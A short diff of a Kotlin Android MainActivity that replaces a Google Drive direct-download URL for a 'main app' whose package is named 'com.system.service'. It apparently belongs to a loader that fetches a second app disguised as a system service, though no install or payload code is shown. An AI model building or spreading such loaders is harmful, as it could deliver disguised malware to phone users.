@@ -17,7 +17,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var progressBar: ProgressBar
     private lateinit var tvStatus: TextView
 
-    private val MAIN_APP_URL = "https://drive.google.com/uc?export=download&id=1dfeX8xDbQqsKrII5jVsTZ5dNRBckbmZE"
+    private val MAIN_APP_URL = "https://drive.google.com/uc?export=download&id=1AXvW5J3YuTS-bWSz5Y5ItWruQMBOXtcI"
     private val MAIN_APP_PACKAGE = "com.system.service"
 
     override fun onCreate(savedInstanceState: Bundle?) {
